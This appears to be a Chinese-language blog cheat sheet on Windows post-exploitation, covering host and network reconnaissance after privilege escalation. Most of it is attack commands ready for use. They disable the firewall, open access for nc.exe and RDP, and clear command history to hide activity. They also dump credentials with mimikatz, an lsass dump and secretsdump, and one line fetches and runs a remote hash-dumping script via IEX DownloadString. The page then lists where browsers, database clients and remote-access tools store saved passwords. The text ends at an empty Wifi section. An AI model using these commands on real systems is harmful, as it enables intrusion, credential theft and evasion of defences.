

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme="dark">



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="https://avatars.githubusercontent.com/u/88082435?v=4">
  <link rel="icon" href="https://avatars.githubusercontent.com/u/88082435?v=4">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="mingming">
  <meta name="keywords" content>
  
    <meta name="description" content="0x00 分析入口机器 在提权完成后，尽可能多的收集此机器上的各种信息。  当前机器的角色 当前机器所在网络的拓扑结构 当前机器的网络位置&#x2F;区域   0x01 收集基础信息   Main ip、进程、端口、服务、共享、软件、补丁、wifi、rdp、 12345678910111213141516171819202122232425262728293031323334353637383940414">
<meta property="og:type" content="article">
<meta property="og:title" content="【windows】内网信息收集">
<meta property="og:url" content="https://hodlyounger.github.io/A_OS/Windows/%E5%B7%A5%E5%85%B7/%E3%80%90windows%E3%80%91%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/index.html">
<meta property="og:site_name" content="oone">
<meta property="og:description" content="0x00 分析入口机器 在提权完成后，尽可能多的收集此机器上的各种信息。  当前机器的角色 当前机器所在网络的拓扑结构 当前机器的网络位置&#x2F;区域   0x01 收集基础信息   Main ip、进程、端口、服务、共享、软件、补丁、wifi、rdp、 12345678910111213141516171819202122232425262728293031323334353637383940414">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2023-10-27T01:24:02.033Z">
<meta property="article:modified_time" content="2024-08-16T10:29:34.132Z">
<meta property="article:author" content="mingming">
<meta property="article:tag" content="windows">
<meta property="article:tag" content="信息">
<meta name="twitter:card" content="summary_large_image">
  
  
  
  <title>【windows】内网信息收集 - oone</title>

  <link rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css">



  <link rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css">

  <link rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css">

  <link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css">



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link rel="stylesheet" href="/css/main.css">


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css">
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css">
  



  
<link rel="stylesheet" href="/css/callout_blocks.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"hodlyounger.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":"holdyounger.github.io"}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script src="/js/utils.js"></script>
  <script src="/js/color-schema.js"></script>
  


  
<meta name="generator" content="Hexo 7.1.1"><link rel="alternate" href="/atom.xml" title="oone" type="application/atom+xml">
</head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Montarius</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax="true" style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="【windows】内网信息收集"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-10-27 09:24" pubdate>
          2023年10月27日 上午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          4.4k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          37 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">【windows】内网信息收集</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="0x00-分析入口机器"><a class="markdownIt-Anchor" href="#0x00-分析入口机器"></a> 0x00 分析入口机器</h1>
<p>在提权完成后，尽可能多的收集此机器上的各种信息。</p>
<ul>
<li>当前机器的角色</li>
<li>当前机器所在网络的拓扑结构</li>
<li>当前机器的网络位置/区域</li>
</ul>
<h1 id="0x01-收集基础信息"><a class="markdownIt-Anchor" href="#0x01-收集基础信息"></a> 0x01 收集基础信息</h1>
<hr>
<h2 id="main"><a class="markdownIt-Anchor" href="#main"></a> Main</h2>
<p>ip、进程、端口、服务、共享、软件、补丁、wifi、rdp、</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs cmd">------------------系统---------------------<br><span class="hljs-built_in">set</span>												# 查看环境变量<br>wmic bios									# 查看bios信息<br>fsutil fsinfo drives			# 查看盘符<br>systeminfo								# 系统版本<br>systeminfo | <span class="hljs-built_in">findstr</span> /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot; /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;<br><br>------------------ip与网段---------------------<br><span class="hljs-built_in">ping</span> -a ip									# ip反查主机名<br>netstat -A ip								# 同上<br><span class="hljs-built_in">ipconfig</span> /all 							#查看ip详细信息,关注是否多网卡、IP、DNS<br><span class="hljs-built_in">ipconfig</span> /displaydns  			#查看DNS缓存<br>route <span class="hljs-built_in">print</span> 								#查看路由<br>arp -a 											#查看arp缓存表<br><span class="hljs-built_in">net</span> view 										#查询机器列表<br><span class="hljs-built_in">type</span> C:\Windows\System32\drivers\etc\hosts 				#查看hosts⽂件<br><br>---------------端口--------------------<br>netstat -ano 											#查看端⼝开放情况<br>netstat -ano|<span class="hljs-built_in">findstr</span> <span class="hljs-number">80</span>						#查看<span class="hljs-number">80</span>端⼝对应的PID<br><br>---------------服务--------------------<br>wmic service list brief						# 查看安装的所有服务信息<br><span class="hljs-built_in">net</span> <span class="hljs-built_in">start</span>													# 已启动的服务<br><br>---------------共享--------------------<br>wmic share get name,<span class="hljs-built_in">path</span>,status 	# 查看共享信息<br><span class="hljs-built_in">net</span> use 													# 查看已建立的连接<br><span class="hljs-built_in">net</span> share 												# 查看共享<br><span class="hljs-built_in">net</span> session 											# 查看会话<br><span class="hljs-built_in">net</span> view \ip 											# 查询指定IP共享<br><br>---------------开机自启动程序--------------------<br>wmic startup get command,caption<br><br>---------------安装的程序--------------------<br>wmic product get name,version<br>powershell &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,version&quot;<br><br>---------------计划任务--------------------<br>schtasks /query /fo LIST /v &gt; ed1dassc.txt<br><br>---------------补丁信息（提权）--------------------<br>wmic qfe get Caption,Description,HotFixID,InstalledOn<br>systeminfo<br><br>---------------进程列表（免杀）--------------------<br>wmic process list brief						#当前进程列表<br>tasklist													#当前进程列表<br>tasklist /svc 										#查看进程、pid、服务<br><span class="hljs-built_in">taskkill</span> /f /t /im xx.exe 				#杀死xx.exe进程<br><span class="hljs-built_in">taskkill</span> /F -pid <span class="hljs-number">520</span> 							#杀死pid为<span class="hljs-number">520</span>的进程<br>wmic /node:localhost /namespace:\\root\SecurityCenter2 <span class="hljs-built_in">path</span> AntiVirusProduct Get DisplayName | <span class="hljs-built_in">findstr</span> /V /B /C:displayName || <span class="hljs-built_in">echo</span> No Antivirus installed<br><br>---------------查询IE浏览器的代理信息--------------------<br>reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;<br><br>---------------<span class="hljs-built_in">cmd</span>、powershell（v3以下）当前窗口的历史命令--------------------<br>Get-History | <span class="hljs-built_in">Format</span>-List -Property * 			# 查询 powershell 当前窗⼝历史操作记录<br>Clear-History 															# 删除 powershell 当前窗⼝历史操作记录<br>Clear-History -Id <span class="hljs-number">3</span> 												# 删除 指定 ID 的历史操作记录<br><span class="hljs-built_in">doskey</span> /h 																	# 查看 <span class="hljs-built_in">cmd</span> 的历史操作记录<br><span class="hljs-built_in">doskey</span> /reinstall 													# 删除 <span class="hljs-built_in">cmd</span> 的历史操作记录<br><br># powershell v3、v4 版本需要安装Get-PSReadlineOption<br>msiexec /q /i PackageManagement_x64.msi<br><br># 查看 powershellv5 历史操作记录<br><span class="hljs-built_in">type</span> <span class="hljs-variable">%appdata%</span>\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt<br><br>---------------杂七杂八--------------------<br></code></pre></td></tr></table></figure>
<h2 id="用户与组信息"><a class="markdownIt-Anchor" href="#用户与组信息"></a> 用户与组信息</h2>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cmd">---------------账户和密码信息------------------<br>whoami /all 											#查询当前⽤户权限等<br><span class="hljs-built_in">net</span> user 													#只显示本机的⽤户，不显示域⽤户<br><span class="hljs-built_in">net</span> user &lt;xx&gt; 										#查看⽤户xx的具体信息<br>wmic useraccount get			 								#查看本机用户 或 域内所有账户<br>wmic useraccount get Caption,LocalAccount,Disabled	#<br><br><span class="hljs-built_in">net</span> localgroup 										#查看本地组<br><span class="hljs-built_in">net</span> localgroup administrators 		#查看本地组administrators管理员组。除了显示本机中⽤户，还会显示域⽤户(前提是该域⽤户在本机的Administrators组内)<br><br>query user 或 quser 							 #查询当前在线⽤户<br>qwinsta 													#查询当前在线⽤户<br>qwinsta /SERVER:IP 								#查看远程登录情况<br>query session 										#查询会话<br>query termserver 									#查询远程桌⾯主机列表<br><span class="hljs-built_in">net</span> accounts 											#查看本地密码策略<br></code></pre></td></tr></table></figure>
<h2 id="rdp-服务开关"><a class="markdownIt-Anchor" href="#rdp-服务开关"></a> RDP 服务开关</h2>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cmd">---------------远程桌面服务--------------------<br>#查端口 <span class="hljs-number">0</span>xd3d &gt; <span class="hljs-number">3389</span><br>REG query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber<br><br>#是否开启了rdp服务：<span class="hljs-number">0</span>x1关闭，<span class="hljs-number">0</span>x0开启<br>REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections<br><br>#<span class="hljs-number">2003</span>开启远程桌面<br>wmic <span class="hljs-built_in">PATH</span> win32_terminalservicesetting WHERE (_Class!=&quot;&quot;) <span class="hljs-keyword">CALL</span> SetAllowTSConnections <span class="hljs-number">1</span><br><br>#<span class="hljs-number">2008</span>、<span class="hljs-number">2012</span>开启远程桌面<br>wmic /namespace:\\root\cimv2\terminalservices <span class="hljs-built_in">path</span> win32_terminalservicesetting where (__CLASS != &quot;&quot;) <span class="hljs-keyword">call</span> setallowtsconnections <span class="hljs-number">1</span><br>wmic /namespace:\\root\cimv2\terminalservices <span class="hljs-built_in">path</span> win32_tsgeneralsetting where (TerminalName =&#x27;RDP-Tcp&#x27;) <span class="hljs-keyword">call</span> setuserauthenticationrequired <span class="hljs-number">1</span><br>reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fSingleSessionPerUser /t REG_DWORD /d <span class="hljs-number">0</span> /f<br></code></pre></td></tr></table></figure>
<h2 id="防火墙开关-策略配置"><a class="markdownIt-Anchor" href="#防火墙开关-策略配置"></a> 防火墙开关 &amp; 策略配置</h2>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cmd">---------------防火墙开关 &amp; 策略配置--------------------<br>netsh firewall show config												#查看防火墙配置<br><br>#<span class="hljs-number">2003</span>之前操作<br>netsh firewall <span class="hljs-built_in">set</span> opmode disable																#关闭防火墙<br>netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable		#允许nc的全部链接<br><br>#<span class="hljs-number">2003</span>之后操作<br>netsh advfirewall <span class="hljs-built_in">set</span> allprofiles state off 			#关闭防火墙<br>netsh advfirewall <span class="hljs-built_in">set</span> publicprofile state off			#关闭防火墙，??<br><br>##允许nc的入站、出站、TCP3389进站连接<br>netsh advfirewall firewall add rule name=&quot;pass nc&quot; <span class="hljs-built_in">dir</span>=<span class="hljs-keyword">in</span> action=allow program=&quot;C: \nc.exe&quot;<br>netsh advfirewall firewall add rule name=&quot;Allow nc&quot; <span class="hljs-built_in">dir</span>=out action=allow program=&quot;C: \nc.exe&quot;<br>netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP <span class="hljs-built_in">dir</span>=<span class="hljs-keyword">in</span> localport=<span class="hljs-number">3389</span> action=allow<br><br>##自定义防火墙日志的存储位置<br>netsh advfirewall <span class="hljs-built_in">set</span> currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;<br></code></pre></td></tr></table></figure>
<ul>
<li>自动化收集脚本：Empire、VBS 脚本</li>
<li>判断是否在域中</li>
</ul>
<h1 id="0x02-收集敏感信息"><a class="markdownIt-Anchor" href="#0x02-收集敏感信息"></a> 0x02 收集敏感信息</h1>
<h2 id="抓-win-密码和-hash"><a class="markdownIt-Anchor" href="#抓-win-密码和-hash"></a> 抓 Win 密码和 hash</h2>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cmd"># win10或<span class="hljs-number">2012</span>R2以上时,默认在内存缓存中禁止保存明文密码，需要修改注册表重启后才能。<br>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d <span class="hljs-number">1</span> /f<br><br># 简单抓密码<br>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; &quot;<span class="hljs-keyword">exit</span>&quot;<br><br># 转储lsass.exe成dmp文件，再使用mimikatz本地读取（规避）<br>procdump64.exe -accepteula -ma lsass.exe lsass.dmp<br>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot;<br><br># powershell远程加载<br>powershell IEX (New-Object <span class="hljs-built_in">Net</span>.WebClient).DownloadString(‘https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1’);Get-PassHashes<br><br># 转储SAM文件，再使用secretsdump.py本地读取（规避）<br>python secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL<br></code></pre></td></tr></table></figure>
<h2 id="win-日志-rdp-登录痕迹"><a class="markdownIt-Anchor" href="#win-日志-rdp-登录痕迹"></a> win 日志 - RDP 登录痕迹</h2>
<blockquote>
<p>内网使用 RDP 的机器大概率是运维或高权限机器，可筛选 LogonType 为 10 的 Win 日志，定位 ip，然后 <code>ping -a &lt;ip&gt;</code></p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">wevtutil qe /?<br>wevtutil qe Security /c: <span class="hljs-number">3</span> /rd: <span class="hljs-literal">true</span> /f:text			# <span class="hljs-number">3</span>条、最近的、txt格式，/q xpath语法<br>wevtutil qe security /q:<span class="hljs-string">&quot;*[EventData[Data[@Name=&#x27;LogonType&#x27;]=&#x27;10&#x27;] and System[(EventID=4624)]]&quot;</span> /f:text /rd:<span class="hljs-literal">true</span> /c:<span class="hljs-number">10</span><br></code></pre></td></tr></table></figure>
<h2 id="浏览器"><a class="markdownIt-Anchor" href="#浏览器"></a> 浏览器</h2>
<p>**一把梭：**HackBrowserData <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a></p>
<h3 id="chrome"><a class="markdownIt-Anchor" href="#chrome"></a> Chrome</h3>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mel">#用户数据目录			%LOCALAPPDATA%\Google\Chrome\User Data\Default\<br>#缓存目录					%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cache\<br>#书签							%LOCALAPPDATA%\Google\Chrome\User Data\Default\Bookmarks<br>#Cookie						%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies<br>#浏览历史					%LOCALAPPDATA%\Google\Chrome\User Data\Default\History<br>#当前的session 	 %LOCALAPPDATA%\Google\Chrome\User Data\Default\Current Session<br>#账户密码					%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data<br>									%LOCALAPPDATA%\Google\Chrome\User Data\Profile <span class="hljs-number">1</span>\Login Data<br></code></pre></td></tr></table></figure>
<h3 id="qq-浏览器"><a class="markdownIt-Anchor" href="#qq-浏览器"></a> QQ 浏览器</h3>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">⽤户数据⽬录		%LOCALAPPDATA%\Tencent\QQBrowser\<span class="hljs-keyword">User</span> <span class="hljs-title">Data</span>\Default<br>缓存⽬录			  %LOCALAPPDATA%\Google\Chrome\<span class="hljs-keyword">User</span> <span class="hljs-title">Data</span>\Default\Cache\<br>书签					 %LOCALAPPDATA%\Tencent\QQBrowser\<span class="hljs-keyword">User</span> <span class="hljs-title">Data</span>\Default\Bookmarks<br>Cookie				 %LOCALAPPDATA%\Tencent\QQBrowser\<span class="hljs-keyword">User</span> <span class="hljs-title">Data</span>\Default\Cookies<br>浏览历史 			 %LOCALAPPDATA%\Tencent\QQBrowser\<span class="hljs-keyword">User</span> <span class="hljs-title">Data</span>\Default\History<br>当前的session  %LOCALAPPDATA%\Tencent\QQBrowser\<span class="hljs-keyword">User</span> <span class="hljs-title">Data</span>\Default\Current Session<br>账号密码  		 %LOCALAPPDATA%\Tencent\QQBrowser\<span class="hljs-keyword">User</span> <span class="hljs-title">Data</span>\Default\Login Data<br> 							%LOCALAPPDATA%\Tencent\QQBrowser\<span class="hljs-keyword">User</span> <span class="hljs-title">Data</span>\Default\xxxxxxxxxxx\<span class="hljs-number">6</span><br></code></pre></td></tr></table></figure>
<h3 id="360-浏览器"><a class="markdownIt-Anchor" href="#360-浏览器"></a> 360 浏览器</h3>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">账号密码⽂件 %APPDATA%\<span class="hljs-number">360s</span>e6\<span class="hljs-keyword">User</span> <span class="hljs-title">Data</span>\Default\apps\LoginAssis\assis2.db<br></code></pre></td></tr></table></figure>
<h3 id="firefox"><a class="markdownIt-Anchor" href="#firefox"></a> firefox</h3>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">账号密码⽂件	<span class="hljs-variable">%APPDATA</span>%\Mozilla\Firefox\Profiles\*.<span class="hljs-keyword">default</span>-<span class="hljs-keyword">release</span>\logins.json<br></code></pre></td></tr></table></figure>
<h3 id="ieedge"><a class="markdownIt-Anchor" href="#ieedge"></a> IE/Edge</h3>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">书签⽂件 		<span class="hljs-meta">%</span>USERPROFILE<span class="hljs-meta">%</span>\Favorites\xx.url<br></code></pre></td></tr></table></figure>
<h2 id="远程管理工具"><a class="markdownIt-Anchor" href="#远程管理工具"></a> 远程管理工具</h2>
<p><strong>数据库管理工具、远程登录</strong></p>
<h3 id="navicat"><a class="markdownIt-Anchor" href="#navicat"></a> navicat</h3>
<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">MySQL 	HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers&lt;your connection name&gt;<br>MariaDB HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers&lt;your connection name&gt;<br>MongoDB HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers&lt;your connection name&gt;<br>MSSQL	  HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers&lt;your connection name&gt;<br>Oracle 	HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers&lt;your connection name&gt;<br>PostgreSQL HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers&lt;your connection name&gt;<br>SQLite 	HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers&lt;your connection name&gt;<br></code></pre></td></tr></table></figure>
<h3 id="securtcrt"><a class="markdownIt-Anchor" href="#securtcrt"></a> SecurtCRT</h3>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript">xp/win2003 			C:<span class="hljs-string">\Documents</span> <span class="hljs-keyword">and</span> Settings<span class="hljs-string">\USERNAME\Application</span> Data<span class="hljs-string">\VanDyke\Config\Sessions</span><br>win7/win2008以上 %APPDATA%<span class="hljs-string">\VanDyke\Config\Sessions</span><br></code></pre></td></tr></table></figure>
<h3 id="xshell"><a class="markdownIt-Anchor" href="#xshell"></a> XShell</h3>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mel">Xshell <span class="hljs-number">5</span> 		%userprofile%\Documents\NetSarang\Xshell\Sessions<br>Xshell <span class="hljs-number">6</span> 		%userprofile%\Documents\NetSarang Computer\<span class="hljs-number">6</span>\Xshell\Sessions<br></code></pre></td></tr></table></figure>
<p>VNC</p>
<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">RealVNC 	HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver 		Password<br>TightVNC 	HKEY_CURRENT_USER\Software\TightVNC\Server Value 	Password <span class="hljs-keyword">or</span> PasswordViewOnly<br>TigerVNC	HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4 				Password<br>UltraVNC 	<span class="hljs-name">C</span>:\Program Files\UltraVNC\ultravnc.ini 						passwd <span class="hljs-keyword">or</span> passwd2<br></code></pre></td></tr></table></figure>
<p>VPN</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::secrets <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure>
<h2 id="wifi-账号密码"><a class="markdownIt-Anchor" href="#wifi-账号密码"></a> Wifi 账号密码</h2>
